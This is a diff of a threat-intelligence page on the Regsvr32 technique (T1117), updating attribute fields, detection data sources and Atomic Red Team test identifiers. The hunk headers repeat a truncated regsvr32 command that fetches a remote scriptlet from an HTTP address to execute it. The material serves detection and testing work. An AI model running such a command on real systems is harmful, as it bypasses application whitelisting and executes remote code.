@@ -13,14 +13,20 @@ Regsvr32.exe can also be used to specifically bypass process whitelisting using 
 
 Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: ['Process whitelisting', 'Anti-virus', 'Digital Certificate Validation']
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['User', 'Administrator']
 * Platforms: ['Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1117
 
@@ -186,7 +192,15 @@ CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.s
                            'attack.execution',
                            'car.2019-04-002',
                            'car.2019-04-003'],
-                  'title': 'Regsvr32 Anomaly'}}]
+                  'title': 'Regsvr32 Anomaly'}},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['ID - 7', 'Sysmon', 'Loaded DLLs']},
+ {'data_source': ['4657', 'Windows Registry']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['Sysmon - ID 7', 'Loaded DLLs']},
+ {'data_source': ['4657', 'Windows Registry']}]
 ```
 
 ## Potential Queries
@@ -207,7 +221,8 @@ CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.s
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Regsvr32': {'atomic_tests': [{'dependencies': [{'description': 'Regsvr32.sct '
+[{'Atomic Red Team Test - Regsvr32': {'atomic_tests': [{'auto_generated_guid': '449aa403-6aba-47ce-8a37-247d21ef0306',
+                                                        'dependencies': [{'description': 'Regsvr32.sct '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'on '
@@ -276,7 +291,8 @@ CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.s
                                                                 'scriptlet '
                                                                 'execution',
                                                         'supported_platforms': ['windows']},
-                                                       {'description': 'Regsvr32.exe '
+                                                       {'auto_generated_guid': 'c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36',
+                                                        'description': 'Regsvr32.exe '
                                                                        'is a '
                                                                        'command-line '
                                                                        'program '
@@ -326,7 +342,8 @@ CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.s
                                                                 'scriptlet '
                                                                 'execution',
                                                         'supported_platforms': ['windows']},
-                                                       {'dependencies': [{'description': 'AllTheThingsx86.dll '
+                                                       {'auto_generated_guid': '08ffca73-9a3d-471a-aeb0-68b4aa3ab37b',
+                                                        'dependencies': [{'description': 'AllTheThingsx86.dll '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'on '
